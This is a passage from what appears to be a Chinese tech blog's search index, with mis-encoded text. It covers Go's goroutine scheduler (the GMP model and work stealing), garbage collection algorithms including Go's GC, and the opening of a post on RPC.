runqueueæ²¡æœ‰ä»»åŠ¡Gäº†ï¼Œé‚£ä¹ˆPä¸å¾—ä¸ä»å…¶ä»–çš„Pé‡Œæ‹¿ä¸€äº›Gæ¥æ‰§è¡Œã€‚\n\nä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœPä»å…¶ä»–çš„Pé‚£é‡Œè¦æ‹¿ä»»åŠ¡çš„è¯ï¼Œä¸€èˆ¬å°±æ‹¿run queueçš„ä¸€åŠï¼Œè¿™å°±ç¡®ä¿äº†æ¯ä¸ªOSçº¿ç¨‹éƒ½èƒ½å……åˆ†çš„ä½¿ç”¨ï¼Œå¦‚ä¸‹å›¾ï¼š\n\n![1](golangåç¨‹è°ƒåº¦/3.png)\n\n\n\n# 3. è°ƒåº¦è¿‡ç¨‹\n\n### 3.1 æœ¯è¯­\n\n1. **å…¨å±€é˜Ÿåˆ—**ï¼ˆGlobal Queueï¼‰ï¼šå­˜æ”¾ç­‰å¾…è¿è¡Œçš„Gã€‚\n2. **Pçš„æœ¬åœ°é˜Ÿåˆ—**ï¼šåŒå…¨å±€é˜Ÿåˆ—ç±»ä¼¼ï¼Œå­˜æ”¾çš„ä¹Ÿæ˜¯ç­‰å¾…è¿è¡Œçš„Gï¼Œå­˜çš„æ•°é‡æœ‰é™ï¼Œä¸è¶…è¿‡256ä¸ªã€‚æ–°å»ºG'æ—¶ï¼ŒG'ä¼˜å…ˆåŠ å…¥åˆ°Pçš„æœ¬åœ°é˜Ÿåˆ—ï¼Œå¦‚æœé˜Ÿåˆ—æ»¡äº†ï¼Œåˆ™ä¼šæŠŠæœ¬åœ°é˜Ÿåˆ—ä¸­ä¸€åŠçš„Gç§»åŠ¨åˆ°å…¨å±€é˜Ÿåˆ—ã€‚\n3. **Påˆ—è¡¨**ï¼šæ‰€æœ‰çš„Péƒ½åœ¨ç¨‹åºå¯åŠ¨æ—¶åˆ›å»ºï¼Œå¹¶ä¿å­˜åœ¨æ•°ç»„ä¸­ï¼Œæœ€å¤šæœ‰`GOMAXPROCS`(å¯é…ç½®)ä¸ªã€‚\n4. **M**ï¼šçº¿ç¨‹æƒ³è¿è¡Œä»»åŠ¡å°±å¾—è·å–Pï¼Œä»Pçš„æœ¬åœ°é˜Ÿåˆ—è·å–Gï¼ŒPé˜Ÿåˆ—ä¸ºç©ºæ—¶ï¼ŒMä¹Ÿä¼šå°è¯•ä»å…¨å±€é˜Ÿåˆ—**æ‹¿**ä¸€æ‰¹Gæ”¾åˆ°Pçš„æœ¬åœ°é˜Ÿåˆ—ï¼Œæˆ–ä»å…¶ä»–Pçš„æœ¬åœ°é˜Ÿåˆ—**å·**ä¸€åŠæ”¾åˆ°è‡ªå·±Pçš„æœ¬åœ°é˜Ÿåˆ—ã€‚Mè¿è¡ŒGï¼ŒGæ‰§è¡Œä¹‹åï¼ŒMä¼šä»Pè·å–ä¸‹ä¸€ä¸ªGï¼Œä¸æ–­é‡å¤ä¸‹å»ã€‚\n\nGoroutineè°ƒåº¦å™¨å’ŒOSè°ƒåº¦å™¨æ˜¯é€šè¿‡Mç»“åˆèµ·æ¥çš„ï¼Œæ¯ä¸ªMéƒ½ä»£è¡¨äº†1ä¸ªå†…æ ¸çº¿ç¨‹ï¼ŒOSè°ƒåº¦å™¨è´Ÿè´£æŠŠå†…æ ¸çº¿ç¨‹åˆ†é…åˆ°CPUçš„æ ¸ä¸Šæ‰§è¡Œã€‚\n\n\n\n### 3.2 æœ‰å…³På’ŒMçš„ä¸ªæ•°é—®é¢˜\n\n1ã€Pçš„æ•°é‡ï¼š\n\n- ç”±å¯åŠ¨æ—¶ç¯å¢ƒå˜é‡`$GOMAXPROCS`æˆ–è€…æ˜¯ç”±`runtime`çš„æ–¹æ³•`GOMAXPROCS()`å†³å®šã€‚è¿™æ„å‘³ç€åœ¨ç¨‹åºæ‰§è¡Œçš„ä»»æ„æ—¶åˆ»éƒ½åªæœ‰`$GOMAXPROCS`ä¸ªgoroutineåœ¨åŒæ—¶è¿è¡Œã€‚\n\n2ã€Mçš„æ•°é‡:\n\n- goè¯­è¨€æœ¬èº«çš„é™åˆ¶ï¼šgoç¨‹åºå¯åŠ¨æ—¶ï¼Œä¼šè®¾ç½®Mçš„æœ€å¤§æ•°é‡ï¼Œé»˜è®¤10000.ä½†æ˜¯å†…æ ¸å¾ˆéš¾æ”¯æŒè¿™ä¹ˆå¤šçš„çº¿ç¨‹æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªé™åˆ¶å¯ä»¥å¿½ç•¥ã€‚\n- runtime/debugä¸­çš„SetMaxThreadså‡½æ•°ï¼Œè®¾ç½®Mçš„æœ€å¤§æ•°é‡\n- ä¸€ä¸ªMé˜»å¡äº†ï¼Œä¼šåˆ›å»ºæ–°çš„Mã€‚\n\nMä¸Pçš„æ•°é‡æ²¡æœ‰ç»å¯¹å…³ç³»ï¼Œä¸€ä¸ªMé˜»å¡ï¼ŒPå°±ä¼šå»åˆ›å»ºæˆ–è€…åˆ‡æ¢å¦ä¸€ä¸ªMï¼Œæ‰€ä»¥ï¼Œå³ä½¿Pçš„é»˜è®¤æ•°é‡æ˜¯1ï¼Œä¹Ÿæœ‰å¯èƒ½ä¼šåˆ›å»ºå¾ˆå¤šä¸ªMå‡ºæ¥ã€‚\n\n\n\n### 3.3 På’ŒMä½•æ—¶ä¼šè¢«åˆ›å»º\n\n1ã€Pä½•æ—¶åˆ›å»ºï¼šåœ¨ç¡®å®šäº†Pçš„æœ€å¤§æ•°é‡nåï¼Œè¿è¡Œæ—¶ç³»ç»Ÿä¼šæ ¹æ®è¿™ä¸ªæ•°é‡åˆ›å»ºnä¸ªPã€‚\n\n2ã€Mä½•æ—¶åˆ›å»ºï¼šæ²¡æœ‰è¶³å¤Ÿçš„Mæ¥å…³è”På¹¶è¿è¡Œå…¶ä¸­çš„å¯è¿è¡Œçš„Gã€‚æ¯”å¦‚æ‰€æœ‰çš„Mæ­¤æ—¶éƒ½é˜»å¡ä½äº†ï¼Œè€ŒPä¸­è¿˜æœ‰å¾ˆå¤šå°±ç»ªä»»åŠ¡ï¼Œå°±ä¼šå»å¯»æ‰¾ç©ºé—²çš„Mï¼Œè€Œæ²¡æœ‰ç©ºé—²çš„ï¼Œå°±ä¼šå»åˆ›å»ºæ–°çš„Mã€‚\n\n\n\n### 3.4 è°ƒåº¦å™¨çš„è®¾è®¡ç­–ç•¥\n\n**å¤ç”¨çº¿ç¨‹**ï¼šé¿å…é¢‘ç¹çš„åˆ›å»ºã€é”€æ¯çº¿ç¨‹ï¼Œè€Œæ˜¯å¯¹çº¿ç¨‹çš„å¤ç”¨ã€‚\n\n+ work stealingæœºåˆ¶ å½“æœ¬çº¿ç¨‹æ— å¯è¿è¡Œçš„Gæ—¶ï¼Œå°è¯•ä»å…¶ä»–çº¿ç¨‹ç»‘å®šçš„På·å–Gï¼Œè€Œä¸æ˜¯é”€æ¯çº¿ç¨‹ã€‚\n\n+ hand offæœºåˆ¶ å½“æœ¬çº¿ç¨‹å› ä¸ºGè¿›è¡Œç³»ç»Ÿè°ƒç”¨é˜»å¡æ—¶ï¼Œçº¿ç¨‹é‡Šæ”¾ç»‘å®šçš„Pï¼ŒæŠŠPè½¬ç§»ç»™å…¶ä»–ç©ºé—²çš„çº¿ç¨‹æ‰§è¡Œã€‚\n\n+ åˆ©ç”¨å¹¶è¡Œï¼š`GOMAXPROCS`è®¾ç½®Pçš„æ•°é‡ï¼Œæœ€å¤šæœ‰`GOMAXPROCS`ä¸ªçº¿ç¨‹åˆ†å¸ƒåœ¨å¤šä¸ªCPUä¸ŠåŒæ—¶è¿è¡Œã€‚`GOMAXPROCS`ä¹Ÿé™åˆ¶äº†å¹¶å‘çš„ç¨‹åº¦ï¼Œæ¯”å¦‚`GOMAXPROCS = æ ¸æ•°/2`ï¼Œåˆ™æœ€å¤šåˆ©ç”¨äº†ä¸€åŠçš„CPUæ ¸è¿›è¡Œå¹¶è¡Œã€‚\n\n+ æŠ¢å ï¼šåœ¨coroutineä¸­è¦ç­‰å¾…ä¸€ä¸ªåç¨‹ä¸»åŠ¨è®©å‡ºCPUæ‰æ‰§è¡Œä¸‹ä¸€ä¸ªåç¨‹ï¼Œåœ¨Goä¸­ï¼Œä¸€ä¸ªgoroutineæœ€å¤šå ç”¨CPU 10msï¼Œé˜²æ­¢å…¶ä»–goroutineè¢«é¥¿æ­»ï¼Œè¿™å°±æ˜¯goroutineä¸åŒäºcoroutineçš„ä¸€ä¸ªåœ°æ–¹ã€‚\n\n+ å…¨å±€Gé˜Ÿåˆ—ï¼šåœ¨æ–°çš„è°ƒåº¦å™¨ä¸­ä¾ç„¶æœ‰å…¨å±€Gé˜Ÿåˆ—ï¼Œä½†åŠŸèƒ½å·²ç»è¢«å¼±åŒ–äº†ï¼Œå½“Mæ‰§è¡Œwork stealingä»å…¶ä»–På·ä¸åˆ°Gæ—¶ï¼Œå®ƒå¯ä»¥ä»å…¨å±€Gé˜Ÿåˆ—è·å–Gã€‚\n\n\n\n# 4. å…¶ä»–é—®é¢˜\n\n### 4.1 ioå¯†é›†å‹å¢å¤§ GOMAXPROCSæœ‰æ•ˆå—\n\n> æœ‰æ•ˆ\n\nå¹¶å‘ä¸€èˆ¬éƒ½æ˜¯è¢«å†…æ ¸é€šè¿‡æ—¶é—´ç‰‡æˆ–è€…ä¸­æ–­æ¥æ§åˆ¶çš„ï¼Œä¸€æ—¦é‡åˆ°IOé˜»å¡æˆ–è€…æ—¶é—´ç‰‡ç”¨å®Œï¼Œå°±ä¼šè½¬ç§»çº¿ç¨‹çš„ä½¿ç”¨æƒã€‚å•æ ¸ä¸å¯èƒ½æœ‰å¹¶è¡Œï¼ŒåŒä¸€æ—¶é—´åªèƒ½æœ‰ä¸€ä¸ªä»»åŠ¡åœ¨è°ƒåº¦ã€‚\n\nGoä¸­runtime.GOMAXPROCSå¯ä»¥è®¾ç½®å¤šæ ¸æ‰§è¡Œä»»åŠ¡ã€‚å¹¶è¡Œæ¯”è¾ƒé€‚åˆcpuè®¡ç®—å¯†é›†å‹ã€‚å¦‚æœIOå¯†é›†å‹ä½¿ç”¨å¤šæ ¸åè€Œä¼šå¢åŠ cpuåˆ‡æ¢çš„æˆæœ¬ã€‚\n\nPå€¼è®¾ç½®å¤ªå°çš„è¯ï¼Œä¼šå½±å“ M çš„æ•°é‡ï¼Œç„¶å M è¢« IO é˜»å¡ï¼Œæ•ˆç‡ä¼šä¸‹é™å¾ˆå¤šã€‚åº”è¯¥é…ç½®åˆ°ç¡¬ä»¶çº¿ç¨‹æ•°ç›®çš„5å€ä»¥ä¸Š, æœ€å¤§ä¸è¦è¶…è¿‡1024ã€‚\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://studygolang.com/articles/26795\n+ https://www.cnblogs.com/sunsky303/p/9705727.html\n+ [ä¸€é“é—®é¢˜å¼•å‘çš„golangè°ƒåº¦](https://txiner.top/post/ä¸€é“é—®é¢˜å¼•å‘çš„golangè°ƒåº¦/)\n+ https://my.oschina.net/90design/blog/1837570\n\n","tags":["golang"],"categories":["golang"]},{"title":"gcåƒåœ¾å›æ”¶å’Œgolangçš„gc","url":"%2Fp%2F26aea798.html","content":"\n# 1. GC ä»‹ç»\n\nGC æ˜¯ä¸€ç§è‡ªåŠ¨ç®¡ç†å†…å­˜çš„æŠ€æœ¯ï¼Œç”¨æ¥å›æ”¶ï¼ˆé‡Šæ”¾ï¼‰ heap ä¸­ä¸å†ä½¿ç”¨çš„å¯¹è±¡ã€‚\n\nGC è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°ä¸¤ä¸ªé˜¶æ®µï¼š\n\n1. åŒºåˆ†æ´»å¯¹è±¡ï¼ˆlive objectï¼‰ä¸åƒåœ¾å¯¹è±¡ï¼ˆgarbageï¼‰\n\n2. å›æ”¶åƒåœ¾å¯¹è±¡çš„å†…å­˜ï¼Œä½¿å¾—ç¨‹åºå¯ä»¥é‡å¤ä½¿ç”¨è¿™äº›å†…å­˜\n\n<!-- more -->\n\n### 1.1 è¿½è¸ªæŠ€æœ¯ï¼ˆTracingï¼‰\n\nè¿™æ˜¯ç›®å‰ä½¿ç”¨èŒƒå›´æœ€å¹¿çš„æŠ€æœ¯ï¼Œä¸€èˆ¬æˆ‘ä»¬æåˆ° GC éƒ½æ˜¯æŒ‡è¿™ç±»ã€‚\n\nè¿™ç±» GC ä»æŸäº›è¢«ç§°ä¸º root çš„å¯¹è±¡å¼€å§‹ï¼Œä¸æ–­è¿½è¸ªå¯ä»¥è¢«å¼•ç”¨åˆ°çš„å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡è¢«ç§°ä¸º**å¯åˆ°è¾¾çš„**ï¼ˆreachableï¼‰ï¼Œå…¶ä»–å‰©ä½™çš„å¯¹è±¡å°±è¢«ç§°ä¸º garbageï¼Œå¹¶ä¸”ä¼šè¢«é‡Šæ”¾ã€‚\n\n\n\n##### 1.1.1 æ ‡è®°æ¸…é™¤(mark-and-sweep)\n\nmarkï¼Œä» root å¼€å§‹è¿›è¡Œæ ‘éå†ï¼Œæ¯ä¸ªè®¿é—®çš„å¯¹è±¡æ ‡æ³¨ä¸ºã€Œä½¿ç”¨ä¸­ã€\n\nsweepï¼Œæ‰«ææ•´ä¸ªå†…å­˜åŒºåŸŸï¼Œå¯¹äºæ ‡æ³¨ä¸ºã€Œä½¿ç”¨ä¸­ã€çš„å¯¹è±¡å»æ‰è¯¥æ ‡å¿—ï¼Œå¯¹äºæ²¡æœ‰è¯¥æ ‡æ³¨çš„å¯¹è±¡ç›´æ¥å›æ”¶æ‰\n\n+ æ¯æ¬¡å¯åŠ¨åƒåœ¾å›æ”¶éƒ½ä¼šæš‚åœå½“å‰æ‰€æœ‰çš„æ­£å¸¸ä»£ç æ‰§è¡Œï¼Œå›æ”¶æ˜¯ç³»ç»Ÿå“åº”èƒ½åŠ›å¤§å¤§é™ä½ã€‚\n\n+  æ ‡è®°éœ€è¦æ‰«ææ•´ä¸ªheap,æ¸…é™¤æ•°æ®ä¼šäº§ç”Ÿheapç¢ç‰‡\n\n  \n\n##### 1.1.2 å‡çº§ç‰ˆä¸‰è‰²æ ‡è®°\n\n1 èµ·åˆæ‰€æœ‰å¯¹è±¡éƒ½æ˜¯ç™½è‰²ã€‚\n\n2 ä»æ ¹å‡ºå‘æ‰«ææ‰€æœ‰å¯è¾¾å¯¹è±¡ï¼Œæ ‡è®°ä¸ºç°è‰²ï¼Œæ”¾å…¥å¾…å¤„ç†é˜Ÿåˆ—ã€‚\n\n3 ä»é˜Ÿåˆ—å–å‡ºç°è‰²å¯¹è±¡ï¼Œå°†å…¶å¼•ç”¨å¯¹è±¡æ ‡è®°ä¸ºç°è‰²æ”¾å…¥é˜Ÿåˆ—ï¼Œè‡ªèº«æ ‡è®°ä¸ºé»‘è‰²ã€‚\n\n4 é‡å¤ 3ï¼Œç›´åˆ°ç°è‰²å¯¹è±¡é˜Ÿåˆ—ä¸ºç©ºã€‚æ­¤æ—¶ç™½è‰²å¯¹è±¡å³ä¸ºåƒåœ¾ï¼Œè¿›è¡Œå›æ”¶ã€‚\n\n\n\næ™®é€šæ ‡è®°åªæœ‰é»‘è‰²å’Œç™½è‰²ï¼Œæ²¡æœ‰ä¸­é—´çš„çŠ¶æ€ï¼Œè¿™å°±è¦æ±‚GCæ‰«æè¿‡ç¨‹å¿…é¡»ä¸€æ¬¡æ€§å®Œæˆï¼Œå¾—åˆ°æœ€åçš„é»‘è‰²å’Œç™½è‰²å¯¹è±¡ï¼Œè¿™ç§æ–¹å¼ä¼šå­˜åœ¨è¾ƒå¤§çš„æš‚åœæ—¶é—´ã€‚\n\nä¸‰è‰²æ ‡è®°å¢åŠ äº†ä¸­é—´çŠ¶æ€ç°è‰²ï¼Œå¢é‡å¼GCè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œåº”ç”¨çº¿ç¨‹çš„è¿è¡Œå¯èƒ½æ”¹å˜äº†å¯¹è±¡å¼•ç”¨æ ‘ï¼Œåªè¦è®©é»‘è‰²å¯¹è±¡ç›´æ¥å¼•ç”¨ç™½è‰²å¯¹è±¡ï¼ŒGCå°±å¯ä»¥å¢é‡å¼çš„è¿è¡Œï¼Œå‡å°‘åœé¡¿æ—¶é—´ã€‚\n\n\n\n##### 1.1.3 å¤åˆ¶æ”¶é›† (Copying Garbage Collection)  \n\nèŠ‚ç‚¹å¤åˆ¶ä¹Ÿæ˜¯åŸºäºè¿½è¸ªçš„ç®—æ³•ã€‚å…¶å°†æ•´ä¸ªå †ç­‰åˆ†ä¸ºä¸¤ä¸ªåŠåŒºï¼ˆsemi-spaceï¼‰ï¼Œä¸€ä¸ªåŒ…å«ç°æœ‰æ•°æ®ï¼Œå¦ä¸€ä¸ªåŒ…å«å·²è¢«åºŸå¼ƒçš„æ•°æ®ã€‚\n\nèŠ‚ç‚¹å¤åˆ¶å¼åƒåœ¾æ”¶é›†ä»åˆ‡æ¢ï¼ˆflipï¼‰ä¸¤ä¸ªåŠåŒºçš„è§’è‰²å¼€å§‹ï¼Œç„¶åæ”¶é›†å™¨åœ¨è€çš„åŠåŒºï¼Œä¹Ÿå°±æ˜¯ From space ä¸­éå†å­˜æ´»çš„æ•°æ®ç»“æ„ï¼Œåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æŸä¸ªå•å…ƒæ—¶æŠŠå®ƒå¤åˆ¶åˆ°æ–°åŠåŒºï¼Œä¹Ÿå°±æ˜¯ To space ä¸­å»ã€‚\n\nåœ¨ From space ä¸­æ‰€æœ‰å­˜æ´»å•å…ƒéƒ½è¢«è®¿é—®è¿‡ä¹‹åï¼Œæ”¶é›†å™¨åœ¨ Tospace ä¸­å»ºç«‹ä¸€ä¸ªå­˜æ´»æ•°æ®ç»“æ„çš„å‰¯æœ¬ï¼Œç”¨æˆ·ç¨‹åºå¯ä»¥é‡æ–°å¼€å§‹è¿è¡Œäº†ã€‚\n\nä¼˜ç‚¹\n\n+ æ‰€æœ‰å­˜æ´»çš„æ•°æ®ç»“æ„éƒ½ç¼©å¹¶åœ°æ’åˆ—åœ¨ To space çš„åº•éƒ¨ï¼Œè¿™æ ·å°±ä¸ä¼šå­˜åœ¨å†…å­˜ç¢ç‰‡çš„é—®é¢˜ã€‚\n\n+ è·å–æ–°å†…å­˜å¯ä»¥ç®€å•åœ°é€šè¿‡é€’å¢è‡ªç”±ç©ºé—´æŒ‡é’ˆæ¥å®ç°ã€‚\n\nç¼ºç‚¹\n\n+ å†…å­˜å¾—ä¸åˆ°å……åˆ†åˆ©ç”¨ï¼Œæ€»æœ‰ä¸€åŠçš„å†…å­˜ç©ºé—´å¤„äºæµªè´¹çŠ¶æ€ã€‚\n\n\n\n##### 1.1.4  åˆ†ä»£æ”¶é›†ï¼ˆGenerational Garbage Collectionï¼‰\n\nåŸºäºè¿½è¸ªçš„åƒåœ¾å›æ”¶ç®—æ³•ï¼ˆæ ‡è®°-æ¸…æ‰«ã€èŠ‚ç‚¹å¤åˆ¶ï¼‰ä¸€ä¸ªä¸»è¦é—®é¢˜æ˜¯åœ¨ç”Ÿå‘½å‘¨æœŸè¾ƒé•¿çš„å¯¹è±¡ä¸Šæµªè´¹æ—¶é—´ï¼ˆé•¿ç”Ÿå‘½å‘¨æœŸçš„å¯¹è±¡æ˜¯ä¸éœ€è¦é¢‘ç¹æ‰«æçš„ï¼‰ã€‚åŒæ—¶å†…å­˜åˆ†é…å­˜åœ¨è¿™ä¹ˆä¸€ä¸ªäº‹å® â€œmost object die youngâ€ã€‚\n\nåŸºäºè¿™ä¸¤ç‚¹ï¼Œåˆ†ä»£åƒåœ¾å›æ”¶ç®—æ³•å°†å¯¹è±¡æŒ‰ç”Ÿå‘½å‘¨æœŸé•¿çŸ­å­˜æ”¾åˆ°å †ä¸Šçš„ä¸¤ä¸ªï¼ˆæˆ–è€…æ›´å¤šï¼‰åŒºåŸŸï¼Œè¿™äº›åŒºåŸŸå°±æ˜¯åˆ†ä»£ï¼ˆgenerationï¼‰ã€‚å¯¹äºæ–°ç”Ÿä»£çš„åŒºåŸŸçš„åƒåœ¾å›æ”¶é¢‘ç‡è¦æ˜æ˜¾é«˜äºè€å¹´ä»£åŒºåŸŸã€‚\n\nåˆ†é…å¯¹è±¡çš„æ—¶å€™ä»æ–°ç”Ÿä»£é‡Œé¢åˆ†é…ï¼Œå¦‚æœåé¢å‘ç°å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸè¾ƒé•¿ï¼Œåˆ™å°†å…¶ç§»åˆ°è€å¹´ä»£ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åš promoteã€‚éšç€ä¸æ–­ promoteï¼Œæœ€åæ–°ç”Ÿä»£çš„å¤§å°åœ¨æ•´ä¸ªå †çš„å ç”¨æ¯”ä¾‹ä¸ä¼šç‰¹åˆ«å¤§ã€‚æ”¶é›†çš„æ—¶å€™é›†ä¸­ä¸»è¦ç²¾åŠ›åœ¨æ–°ç”Ÿä»£å°±ä¼šç›¸å¯¹æ¥è¯´æ•ˆç‡æ›´é«˜ï¼ŒSTW æ—¶é—´ä¹Ÿä¼šæ›´çŸ­ã€‚\n\nä¼˜ç‚¹ \n\n+ æ€§èƒ½æ›´ä¼˜ã€‚\n\nç¼ºç‚¹ \n\n+ å®ç°å¤æ‚ã€‚\n\n\n\n### 1.2 å¼•ç”¨è®¡æ•°ï¼ˆReference countingï¼‰\n\nå¼•ç”¨è®¡æ•°ç±» GC ä¼šè®°å½•æ¯ä¸ªå¯¹è±¡çš„å¼•ç”¨æ¬¡æ•°ï¼Œå½“å¼•ç”¨æ¬¡æ•°ä¸º0æ—¶ï¼Œå°±ä¼šè¢«å›æ”¶ï¼Œè¿™ç±» GC å®ç°èµ·æ¥è¾ƒä¸ºç®€å•ã€‚é‡‡ç”¨è¿™ç±» GC çš„ä¸»æµè¯­è¨€æœ‰ï¼šPython/PHP/[Perl](https://stackoverflow.com/questions/2972021/garbage-collection-in-perl)/TCL/Objective-C/C++ çš„ share_ptr\n\nä¼˜ç‚¹\n\n+ ç®—æ³•æ˜“äºå®ç°ã€‚\n\n+ å†…å­˜å•å…ƒèƒ½å¤Ÿå¾ˆå¿«è¢«å›æ”¶ã€‚ç›¸æ¯”äºå…¶ä»–åƒåœ¾å›æ”¶ç®—æ³•ï¼Œå †è¢«è€—å°½æˆ–è€…è¾¾åˆ°æŸä¸ªé˜ˆå€¼æ‰ä¼šè¿›è¡Œåƒåœ¾å›æ”¶ã€‚\n\n+ æ¸è¿›å¼ã€‚å†…å­˜ç®¡ç†ä¸ç”¨æˆ·ç¨‹åºçš„æ‰§è¡Œäº¤ç»‡åœ¨ä¸€èµ·ï¼Œå°† GC çš„ä»£ä»·åˆ†æ•£åˆ°æ•´ä¸ªç¨‹åºã€‚ä¸åƒæ ‡è®°-æ¸…æ‰«ç®—æ³•éœ€è¦ STW (Stop The Worldï¼ŒGC çš„æ—¶å€™æŒ‚èµ·ç”¨æˆ·ç¨‹åº)ã€‚\n\nç¼ºç‚¹\n\n+ åŸå§‹çš„å¼•ç”¨è®¡æ•°ä¸èƒ½å¤„ç†å¾ªç¯å¼•ç”¨ã€‚\n\n+ ç»´æŠ¤å¼•ç”¨è®¡æ•°é™ä½è¿è¡Œæ•ˆç‡ã€‚\n\nã€Œè¿½è¸ªã€ä¸ã€Œå¼•ç”¨è®¡æ•°ã€è¿™ä¸¤ç±» GC å„æœ‰åƒç§‹ï¼ŒçœŸæ­£çš„å·¥ä¸šçº§å®ç°ä¸€èˆ¬æ˜¯è¿™ä¸¤è€…çš„ç»“åˆï¼Œä¸åŒçš„è¯­è¨€æœ‰æ‰€åé‡è€Œå·²ã€‚\n\n\n\n# 2. GOçš„GC\n\ngoè¯­è¨€åƒåœ¾å›æ”¶æ€»ä½“é‡‡ç”¨çš„æ˜¯ç»å…¸çš„ mark and sweep ç®—æ³•ã€‚\n\n### 2.1 å¹¶è¡Œ\n\nGoå¦‚ä½•å‡çŸ­è¿™ä¸ªè¿‡ç¨‹å‘¢ï¼Ÿæ ‡è®°-æ¸…é™¤(mark and sweep)ç®—æ³•åŒ…å«ä¸¤éƒ¨åˆ†é€»è¾‘ï¼šæ ‡è®°å’Œæ¸…é™¤ã€‚ æˆ‘ä»¬çŸ¥é“Golangä¸‰è‰²æ ‡è®°æ³•ä¸­æœ€ååªå‰©ä¸‹çš„é»‘ç™½ä¸¤ç§å¯¹è±¡ï¼Œé»‘è‰²å¯¹è±¡æ˜¯ç¨‹åºæ¢å¤åæ¥ç€ä½¿ç”¨çš„å¯¹è±¡ï¼Œå¦‚æœä¸ç¢°è§¦é»‘è‰²å¯¹è±¡ï¼Œåªæ¸…é™¤ç™½è‰²çš„å¯¹è±¡ï¼Œè‚¯å®šä¸ä¼šå½±å“ç¨‹åºé€»è¾‘ã€‚æ‰€ä»¥ï¼šæ¸…é™¤æ“ä½œå’Œç”¨æˆ·é€»è¾‘å¯ä»¥å¹¶å‘ã€‚\n\n### 2.2 ä¸ºä»€ä¹ˆgolangçš„gcä¸æ•´ç†ã€ä¸åˆ†ä»£ï¼Ÿ\n\nå¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œé¦–å…ˆæˆ‘ä¸å¾—ä¸è¯´çš„æ˜¯ï¼Œåˆ†ä»£ç¡®å®èƒ½å¾ˆå¥½çš„æé«˜gcçš„æ•ˆç‡ï¼Œå› ä¸ºå¤§å¤šæ•°å¯¹è±¡ä½¿ç”¨çš„æ—¶é—´æ˜¯å¾ˆçŸ­çš„ï¼Œè€Œé•¿æ—¶é—´å ç”¨çš„å¯¹è±¡æ˜¯å¾ˆå°‘çš„ï¼Œè¿™ä¹Ÿæ˜¯javaä¸­åˆ†ä»£çš„åŸå› ã€‚è€Œå¯¹äºæ•´ç†ï¼Œæ•´ç†çš„è¯æœ‰åˆ©äºå†…å­˜çš„ç®¡ç†å’Œå›æ”¶ï¼Œå½“å¯¹è±¡è¢«å›æ”¶ä¹‹åï¼Œä¼šå‡ºç°å¾ˆå¤šçš„å†…å­˜ç¢ç‰‡ï¼Œè€Œæ•´ç†å¯ä»¥å¾ˆå¥½çš„é‡æ–°è§„èŒƒå†…å­˜ï¼Œå›æ”¶é‚£äº›ä¸éœ€è¦çš„é¡µã€‚\n\né‚£ä¹ˆgolangä¸ºå•¥ä¸åšå‘¢ï¼Ÿé¦–å…ˆæ˜¯å¤æ‚ï¼Œæˆ‘ä»¬çœ‹javaåˆ†ä»£å›æ”¶çš„å®ç°å°±éå¸¸çš„å¤æ‚ï¼Œå®ç°èµ·æ¥éœ€è¦å¾ˆå¤§çš„åŠ›æ°”ï¼Œè€Œå½“å‰çš„golangçš„gcæ•ˆç‡å·²ç»å¯èƒ½å·²ç»æ»¡è¶³éœ€æ±‚äº†ã€‚ç„¶æ˜¯å°±æ˜¯æ•´ç†ï¼Œå…¶å®æ•´ç†è¿™å—æ˜¯ç”±å†…å­˜ç®¡ç†æ¨¡å—æ¥ç®¡ç†çš„ï¼Œè€Œgolangä¸­çš„å†…å­˜ç®¡ç†åœ¨åˆ†é…çš„é˜¶æ®µå·²ç»åˆ©ç”¨äº†æœ€å°åŒ–çš„åŸåˆ™ï¼Œæ¯æ¬¡ç»™åˆ°çš„éƒ½æ˜¯åˆé€‚çš„å¤§å°ï¼Œæ‰€ä»¥æ•´ç†è¿™å—å°±äº¤ç”±ä»–ä»¬è¿›è¡Œæ¥ç®¡äº†ï¼Œgcè¿™å—åªè´Ÿè´£å›æ”¶å°±å¯ä»¥äº†ã€‚\n\n### 2.3 ä½•æ—¶è§¦å‘ GC\n\n+ åœ¨å †ä¸Šåˆ†é…å¤§äº 32K byte å¯¹è±¡çš„æ—¶å€™è¿›è¡Œæ£€æµ‹æ­¤æ—¶æ˜¯å¦æ»¡è¶³åƒåœ¾å›æ”¶æ¡ä»¶ï¼Œå¦‚æœæ»¡è¶³åˆ™è¿›è¡Œåƒåœ¾å›æ”¶ã€‚\n\n+ ä¸Šé¢æ˜¯è‡ªåŠ¨åƒåœ¾å›æ”¶ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯ä¸»åŠ¨åƒåœ¾å›æ”¶ï¼Œé€šè¿‡è°ƒç”¨ runtime.GC()ï¼Œè¿™æ˜¯é˜»å¡å¼çš„ã€‚\n+ æˆ‘ä»¬ä¸Šé¢è®²äº†ä¸¤ç§ GC è§¦å‘æ–¹å¼ï¼šè‡ªåŠ¨æ£€æµ‹å’Œç”¨æˆ·ä¸»åŠ¨è°ƒç”¨ã€‚é™¤æ­¤ä¹‹å Golang æœ¬èº«è¿˜ä¼šå¯¹è¿è¡ŒçŠ¶æ€è¿›è¡Œç›‘æ§ï¼Œå¦‚æœè¶…è¿‡ä¸¤åˆ†é’Ÿæ²¡æœ‰ GCï¼Œåˆ™è§¦å‘ GCã€‚ç›‘æ§å‡½æ•°æ˜¯ `sysmon()`ï¼Œåœ¨ä¸» goroutine ä¸­å¯åŠ¨ã€‚\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://juejin.im/post/5c8525666fb9a049ea39c3e6\n+ https://draveness.me/golang-garbage-collector/\n+ http://legendtkl.com/2017/04/28/golang-gc/","tags":["gc"],"categories":["golang"]},{"title":"rpcçš„ä»‹ç»","url":"%2Fp%2F317a11e.html","content":"\n\n\n\n# 1. RPCï¼ˆRemote Procedure Callï¼‰è¿œç¨‹è¿‡ç¨‹è°ƒç”¨\n\nåœ¨åˆ†å¸ƒå¼è®¡ç®—ï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆè‹±è¯­ï¼šRemote Procedure Callï¼Œç¼©å†™ä¸º 